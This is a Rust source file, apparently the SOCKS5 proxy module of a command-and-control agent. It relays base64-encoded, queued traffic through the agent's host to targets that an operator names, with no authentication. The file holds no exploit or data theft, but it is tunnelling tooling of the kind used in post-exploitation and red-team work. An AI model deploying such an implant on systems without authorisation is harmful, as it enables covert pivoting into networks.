// socks.rs
use crate::AgentTask;
use base64::{engine::general_purpose, Engine as _};
use once_cell::sync::Lazy;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::error::Error;
use std::io::{ErrorKind, Read, Write};
use std::net::{Ipv4Addr, Ipv6Addr, SocketAddr, TcpStream, ToSocketAddrs};
use std::sync::{mpsc, Arc, Mutex};
use std::time::Duration;

#[derive(Deserialize, Serialize, Debug, Clone)]
pub struct SocksMsg {
    pub exit: bool,
    pub server_id: u32,
    pub data: String,
}

// =========================
// Global SOCKS Queues
// =========================
pub static SOCKS_INBOUND_QUEUE: Lazy<Arc<Mutex<Vec<SocksMsg>>>> =
    Lazy::new(|| Arc::new(Mutex::new(Vec::new())));
pub static SOCKS_OUTBOUND_QUEUE: Lazy<Arc<Mutex<Vec<SocksMsg>>>> =
    Lazy::new(|| Arc::new(Mutex::new(Vec::new())));

#[derive(Debug)]
pub struct SocksState {
    pub connections: Arc<Mutex<HashMap<u32, TcpStream>>>,
}

impl SocksState {
    pub fn new() -> Self {
        Self {
            connections: Arc::new(Mutex::new(HashMap::new())),
        }
    }
}

// =========================
// SOCKS Processing Functions
// =========================

/// Process SOCKS messages synchronously (called from main agent loop)
pub fn process_socks_messages_sync() -> Result<(), Box<dyn Error>> {
    // Use a static state to maintain connections across calls
    static SOCKS_STATE: Lazy<Arc<SocksState>> = Lazy::new(|| Arc::new(SocksState::new()));
    let state = SOCKS_STATE.clone();
 
    // Drain inbound queue
    let msgs_to_process: Vec<SocksMsg> = {
        if let Ok(mut queue) = SOCKS_INBOUND_QUEUE.lock() {
            if !queue.is_empty() {
                let msgs = queue.drain(..).collect::<Vec<_>>();
                eprintln!(
                    "DEBUG: Processing {} SOCKS messages from inbound queue",
                    msgs.len()
                );
                msgs
            } else {
                Vec::new()
            }
        } else {
            Vec::new()
        }
    };

    if !msgs_to_process.is_empty() {
        if let Err(e) = process_socks_messages(msgs_to_process, &state) {
            eprintln!("SOCKS error: {e}");
            // Don't propagate the error to avoid panicking the main agent
        }
    }

    Ok(())
}

/// Legacy function (not used in new implementation)
pub fn start_socks(
    _tx: &mpsc::Sender<serde_json::Value>,
    _rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    eprintln!("DEBUG: Legacy SOCKS thread started (not used in new implementation)");
    Ok(())
}

// =========================
// SOCKS Message Processing
// =========================
fn process_socks_messages(
    msgs: Vec<SocksMsg>,
    state: &Arc<SocksState>,
) -> Result<(), Box<dyn Error>> {
    let mut conns = state.connections.lock().unwrap();
    let mut responses = Vec::new();

    for msg in msgs {
        if msg.exit {
            if let Some(stream) = conns.remove(&msg.server_id) {
                let _ = stream.shutdown(std::net::Shutdown::Both);
                eprintln!("DEBUG: Closed connection {}", msg.server_id);
            }
            continue;
        }

        let data = general_purpose::STANDARD.decode(&msg.data).unwrap_or_default();
        if data.is_empty() {
            continue;
        }

        eprintln!(
            "DEBUG: Processing message for server_id {} ({} bytes)",
            msg.server_id,
            data.len()
        );

        if let Some(stream) = conns.get_mut(&msg.server_id) {
            // Write data to the target server
            if let Err(e) = stream.write_all(&data) {
                eprintln!(
                    "DEBUG: Failed to write to target server for {}: {}",
                    msg.server_id, e
                );
                responses.push(SocksMsg {
                    exit: true,
                    server_id: msg.server_id,
                    data: String::new(),
                });
                conns.remove(&msg.server_id);
                continue;
            }

            // Read available response data
            let mut buf = [0u8; 4096];
            stream.set_read_timeout(Some(Duration::from_millis(50)))?;

            match stream.read(&mut buf) {
                Ok(0) => {
                    eprintln!("DEBUG: Target closed connection for {}", msg.server_id);
                    responses.push(SocksMsg {
                        exit: true,
                        server_id: msg.server_id,
                        data: String::new(),
                    });
                    conns.remove(&msg.server_id);
                }
                Ok(n) => {
                    eprintln!(
                        "DEBUG: Read {} bytes from target for connection {}",
                        n, msg.server_id
                    );
                    responses.push(SocksMsg {
                        exit: false,
                        server_id: msg.server_id,
                        data: general_purpose::STANDARD.encode(&buf[..n]),
                    });
                }
                Err(e) if e.kind() == ErrorKind::WouldBlock || e.kind() == ErrorKind::TimedOut => {
                    // No data yet — normal
                }
                Err(e) => {
                    eprintln!(
                        "DEBUG: Read error from target for {}: {}",
                        msg.server_id, e
                    );
                    responses.push(SocksMsg {
                        exit: true,
                        server_id: msg.server_id,
                        data: String::new(),
                    });
                    conns.remove(&msg.server_id);
                }
            }
        } else {
            // ======================
            // Phase 1: SOCKS5 Greeting
            // ======================
            if data.len() == 3 && data[0] == 0x05 && data[1] == 0x01 && data[2] == 0x00 {
                eprintln!("DEBUG: SOCKS5 handshake greeting received");
                responses.push(SocksMsg {
                    exit: false,
                    server_id: msg.server_id,
                    data: general_purpose::STANDARD.encode(&[0x05, 0x00]), // no auth required
                });
                continue;
            }

            // ======================
            // Phase 2: SOCKS5 Connect
            // ======================
            if let Some((target_addr, response_data)) = handle_socks_connect(&data) {
                match TcpStream::connect(&target_addr) {
                    Ok(stream) => {
                        let _ = stream.set_nodelay(true);
                        responses.push(SocksMsg {
                            exit: false,
                            server_id: msg.server_id,
                            data: general_purpose::STANDARD.encode(&response_data),
                        });
                        conns.insert(msg.server_id, stream);
                        eprintln!("DEBUG: Established SOCKS5 connection to {:?}", target_addr);
                    }
                    Err(e) => {
                        let err_resp = build_socks5_error(0x05);
                        responses.push(SocksMsg {
                            exit: false,
                            server_id: msg.server_id,
                            data: general_purpose::STANDARD.encode(&err_resp),
                        });
                        eprintln!("DEBUG: Failed to connect to {:?}: {}", target_addr, e);
                    }
                }
            } else {
                eprintln!(
                    "DEBUG: Received data for unknown or invalid connection {} ({} bytes)",
                    msg.server_id,
                    data.len()
                );
            }
        }
    }

    // Send accumulated responses
    if !responses.is_empty() {
        let mut q = SOCKS_OUTBOUND_QUEUE.lock().unwrap();
        q.extend(responses);
    }

    Ok(())
}

// =========================
// SOCKS5 Parsing Helpers
// =========================
fn handle_socks_connect(data: &[u8]) -> Option<(SocketAddr, Vec<u8>)> {
    if data.len() < 10 {
        return None;
    }
    if data[0] != 0x05 || data[1] != 0x01 || data[2] != 0x00 {
        return None;
    }

    let atyp = data[3];
    let addr = match atyp {
        0x01 => {
            if data.len() < 10 {
                return None;
            }
            let ip = Ipv4Addr::new(data[4], data[5], data[6], data[7]);
            let port = u16::from_be_bytes([data[8], data[9]]);
            SocketAddr::from((ip, port))
        }
        0x03 => {
            let domain_len = data[4] as usize;
            if data.len() < 5 + domain_len + 2 {
                return None;
            }
            let domain = String::from_utf8_lossy(&data[5..5 + domain_len]);
            let port = u16::from_be_bytes([data[5 + domain_len], data[5 + domain_len + 1]]);
            (domain.as_ref(), port).to_socket_addrs().ok()?.next()?
        }
        0x04 => {
            if data.len() < 22 {
                return None;
            }
            let mut octets = [0u8; 16];
            octets.copy_from_slice(&data[4..20]);
            let ip = Ipv6Addr::from(octets);
            let port = u16::from_be_bytes([data[20], data[21]]);
            SocketAddr::from((ip, port))
        }
        _ => return None,
    };

    let response = build_socks5_success(addr);
    Some((addr, response))
}

fn build_socks5_success(addr: SocketAddr) -> Vec<u8> {
    let mut res = vec![0x05, 0x00, 0x00];
    match addr {
        SocketAddr::V4(v4) => {
            res.push(0x01);
            res.extend_from_slice(&v4.ip().octets());
            res.extend_from_slice(&v4.port().to_be_bytes());
        }
        SocketAddr::V6(v6) => {
            res.push(0x04);
            res.extend_from_slice(&v6.ip().octets());
            res.extend_from_slice(&v6.port().to_be_bytes());
        }
    }
    res
}

fn build_socks5_error(code: u8) -> Vec<u8> {
    vec![0x05, code, 0x00, 0x01, 0, 0, 0, 0, 0, 0]
}

// =========================
// SOCKS Queue Management
// =========================
pub fn get_socks_responses() -> Vec<SocksMsg> {
    if let Ok(mut queue) = SOCKS_OUTBOUND_QUEUE.lock() {
        queue.drain(..).collect()
    } else {
        Vec::new()
    }
}
